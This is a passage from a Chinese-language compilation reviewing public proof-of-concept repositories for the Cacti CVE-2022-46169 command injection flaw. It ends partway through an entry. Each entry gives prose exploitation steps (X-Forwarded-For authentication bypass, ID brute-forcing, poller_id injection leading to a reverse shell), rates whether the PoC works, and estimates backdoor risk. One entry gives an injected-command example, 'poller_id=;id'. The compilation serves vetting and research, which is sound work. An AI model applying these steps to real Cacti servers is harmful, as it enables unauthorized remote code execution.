代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
